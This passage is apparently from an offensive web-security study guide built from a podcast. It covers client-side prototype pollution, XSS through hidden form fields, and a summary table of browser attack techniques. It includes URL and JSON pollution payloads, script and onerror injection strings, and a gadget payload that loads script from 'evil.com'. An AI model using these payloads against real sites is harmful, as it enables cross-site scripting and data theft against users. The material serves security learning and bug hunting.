  - Login/signup pages (redirect form submissions to attacker server)
  - Single-page applications that lazy-load modules via relative paths

- **Limitations:**
  - Only affects relative URLs — absolute URLs (https://...) are not changed
  - CSP `base-uri` directive can restrict allowed base tag values
  - Only affects URLs that appear AFTER the base tag in DOM order
  - Some frameworks use absolute URLs in production builds

---

## PART 13 — Prototype Pollution (Client-Side)

### Technique 18 — Client-Side Prototype Pollution via URL Parameters

- **What it is:** Prototype pollution allows an attacker to inject properties into `Object.prototype`, which then propagate to ALL JavaScript objects in the application. On the client side, this is typically triggered via URL parameters like `__proto__[property]=value` or `constructor[prototype][property]=value`. Gareth Hayes' book provides scanning techniques and URL-based payloads.

- **Why it works:** JavaScript's prototype chain means every object inherits from `Object.prototype`. If a function recursively merges user input into an object without checking for `__proto__` or `constructor`, the attacker can set arbitrary properties on the base prototype. These properties then appear on every object in the application, potentially triggering XSS gadgets.

- **Code example — Vulnerable merge function:**
```javascript
// Common vulnerable pattern (NOT Lodash — normal developer code)
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// URL: https://target.com/page?__proto__[isAdmin]=true
// If query params are parsed into an object and merged:
let params = parseQueryString(location.search);
let config = {};
merge(config, params);

// Now: ({}).isAdmin === true  (EVERY object has isAdmin=true)
```

- **Code example — URL-based prototype pollution payloads:**
```
# Standard payload
https://target.com/?__proto__[polluted]=true

# Constructor variant
https://target.com/?constructor[prototype][polluted]=true

# Nested object notation (depends on parser)
https://target.com/?__proto__.polluted=true

# JSON body in POST
{"__proto__": {"polluted": "true"}}
{"constructor": {"prototype": {"polluted": "true"}}}
```

- **Code example — Scanning for client-side prototype pollution:**
```javascript
// Gareth Hayes' technique — add to URL and check in console:
// Visit: https://target.com/page?__proto__[testpollution]=polluted

// Then in browser console:
let testObj = {};
if (testObj.testpollution === 'polluted') {
  console.log('VULNERABLE to prototype pollution!');
}
```

- **Code example — Exploiting with XSS gadget:**
```javascript
// Many libraries check: if (options.transport_url) { ... }
// If you can pollute transport_url, you control a URL

// Payload:
// ?__proto__[transport_url]=data:,alert(1)//
// or
// ?__proto__[transport_url]=//evil.com/xss.js

// The library reads options.transport_url (which falls through to prototype)
// and loads your malicious script
```

- **Attack flow (automated scanning):**
```
Headless browser (Puppeteer/Playwright)
           |
           v
For each URL in recon list:
  Visit URL + ?__proto__[pptest]=true
           |
           v
Execute in page context: ({}).pptest === 'true'
           |
           v
If true --> prototype pollution confirmed
           |
           v
Scan for known gadgets (transport_url, innerHTML, src, etc.)
           |
           v
Chain pollution + gadget --> XSS
```

- **Where to apply:**
  - Any application that parses URL query parameters into objects
  - Applications using custom deep-merge/extend functions
  - React, Vue, Angular apps with client-side configuration objects
  - Can be automated at scale with headless browser + payload spraying

- **Limitations:**
  - Finding a pollution source is only half the battle — need an exploitable **gadget**
  - Modern Lodash (4.17.12+) and jQuery (3.4.0+) have been patched
  - `Object.create(null)` objects are immune
  - `Object.freeze(Object.prototype)` is an effective defense

---

## PART 14 — Hidden Input Reverse-Engineering for XSS

### Technique 19 — Mining Hidden Form Fields for Injectable URL Parameters

- **What it is:** When hunting for reflected XSS, inspect hidden `<input>` fields on the page and try their `name` or `id` attributes as URL query parameters. Many applications reflect URL parameters into hidden form fields without proper sanitization.

- **Why it works:** Developers often pre-populate hidden form fields from URL query parameters (for CSRF tokens, state tracking, redirect URLs, etc.). Since these fields are hidden, developers may assume they're not attacker-controlled and skip sanitization. If the value is reflected from a URL parameter, you may be able to inject HTML/JS.

- **Code example — Discovering injectable parameters:**
```html
<!-- View page source and find: -->
<form action="/submit">
  <input type="hidden" name="state" value="default">
  <input type="hidden" name="redirect_url" value="">
  <input type="hidden" name="ref_code" value="">
</form>

<!-- Try these as URL params: -->
<!-- https://target.com/page?state="><script>alert(1)</script> -->
<!-- https://target.com/page?redirect_url="><script>alert(1)</script> -->
<!-- https://target.com/page?ref_code="><img/src/onerror=alert(1)> -->
```

- **Where to apply:**
  - Every web application — always inspect hidden inputs
  - Login, registration, password reset, and checkout pages (often have hidden state)
  - Pages with multi-step forms (state carried in hidden fields)
  - Combine with popover XSS (Technique 1) for hidden element exploitation

---

## MASTER SUMMARY TABLE

| # | Technique | Category | Where to Apply |
|---|-----------|----------|----------------|
| 1 | Popover Target XSS | XSS (1-click) | Chrome; WAF bypass; hidden/disabled elements |
| 2 | Double-Equals Attribute Confusion | WAF/Filter Bypass | Regex-based WAFs; HTML sanitizer libraries |
| 3 | Math Element Clickable Tags (Firefox) | XSS (1-click) | Firefox-only; when event handlers are filtered |
| 4 | Numeric Close Tags to Comments | Parser Confusion | Chaining with other parser differentials |
| 5 | Question Mark Tag Comments (`<?`) | Parser Confusion | When `!` is blocked; comment smuggling |
| 6 | Dynamic `import()` for XSS | XSS Payload Delivery | Length-limited XSS; post-DOM-load injection |
| 7 | HTML Comments in JS (`<!--`) | JS Comment Smuggling | Injection in JS context; when `//` is filtered |
| 8 | Hashbang Comment (`#!`) | JS Comment Smuggling | First-line JS injection; edge case filter bypass |
| 9 | Closing HTML Comment as JS Comment (`-->`) | JS Comment Smuggling | Mid-script injection; when `//` is filtered |
| 10 | `</script>` Tag Closure Escape | XSS Context Escape | JS string injection when quotes are escaped |
| 11 | JSONP Callback CSP Bypass | CSP Bypass | Targets whitelisting Google/YouTube/CDN domains |
| 12 | Meta CSP to Block Sanitizers | CSP Manipulation | HTML injection before sanitizer script loads |
| 13 | Meta Refresh Zero-Click Redirect | Open Redirect / SSRF | HTML injection; headless browsers; no-JS contexts |
| 14 | Meta Content-Type Encoding Change | Encoding Attack | Legacy systems; PDF generators; charset not in headers |
| 15 | CSS Keylogger via Style Injection | Data Exfiltration | React apps; when style injection is possible |
| 16 | DOM Clobbering with Collections | Variable Hijacking | HTML injection before JS that reads `window.*` |
| 17 | Base Tag Relative URL Hijack | Script/Form Hijacking | HTML injection (head OR body); relative URL pages |
| 18 | Client-Side Prototype Pollution | Pollution + Gadget | Query param parsing; deep-merge functions |
| 19 | Hidden Input Parameter Discovery | Recon / XSS | Every target; hidden form fields as URL params |

---

## KEY QUOTES WORTH REMEMBERING

> "There's nothing in the browser spec or anywhere that states that you have to have valid JavaScript in your script tags. You can have an open quote that never ends, and then you just close it with a script tag." — Joel Margolis

> "The only way that the browser's gonna know that script tag is gonna end is with an actual less than slash script end tag. And so if you do that inside of the JavaScript context, it's gonna just cut off the rest of the JavaScript." — Justin Gardner

> "Don't forget about the magical math element, which can make any HTML element clickable within the Firefox browser." — RCE Man (quoted)

> "I was a hundred percent sure this was a Node.js thing and that this was not going to be possible in standard JavaScript within the browser. And it works." — Joel Margolis (on dynamic `import()`)

> "If you look up the browser market share stats... Firefox is at about two and a half percent. It's underneath Edge." — Joel Margolis

> "Accessing any element by its ID off the window object is already uncommon. It's super counterintuitive behavior... it seems fairly arbitrary that just defining an ID would make it accessible on the window." — Joel Margolis

> "I just tested and in my body element, I put a base href and a script tag and it is trying to load it from the base URL that's in the body tag... Chrome does it too." — Joel Margolis

> "If you think about, or you just read some developer code, you'll realize how many places it's possible to get prototype pollution just by writing JavaScript. You don't have to be using Lodash." — Joel Margolis

> "Warning: do not export a function called `then` from a module, because this will cause the module to behave differently when imported dynamically than when imported statically." — MDN Web Docs (quoted by Joel)

---

## RESOURCES MENTIONED

- **PortSwigger Research Twitter** — Follow for cutting-edge XSS vectors and browser quirks
- **PortSwigger Web Security Academy** — Free labs for DOM clobbering, prototype pollution, XSS
  - DOM Clobbering section: https://portswigger.net/web-security/dom-based/dom-clobbering
  - Prototype Pollution section: https://portswigger.net/web-security/prototype-pollution
- **"JavaScript for Hackers" by Gareth Hayes** — $20 on Leanpub; page 66 covers JS comment types; prototype pollution section
- **Gareth Hayes' personal website** — garethhays.co.uk (CSS-only interactive game / quirks showcase)
- **Google CSP Evaluator** — https://csp-evaluator.withgoogle.com/
- **LiveOverflow YouTube** — Video on numeric/question-mark HTML tag parsing quirks in Chromium
- **JSluice by Tom Hudson (TomNomNom)** — Go tool using TreeSitter for extracting URLs/paths/secrets from JS files
- **MDN Web Docs on dynamic `import()`** — Documentation with `then()` export warning
- **Chromium source code** — Tokenizer handling of `<?` and numeric tags (linked in LiveOverflow video comments)
- **DOMPurify** — Client-side HTML sanitizer (the "super boss" that blocked LiveOverflow's numeric tag bypass)
- **File Descriptor** — Referenced as source for `import()` XSS technique
- **Sroosh/Erstelle** — Follow-up research on popover + attribute confusion
- **Cure53** — Confirmed popover works on hidden/disabled elements
- **Hermes (Meta)** — Meta's JavaScript engine, separate from V8; has its own research community
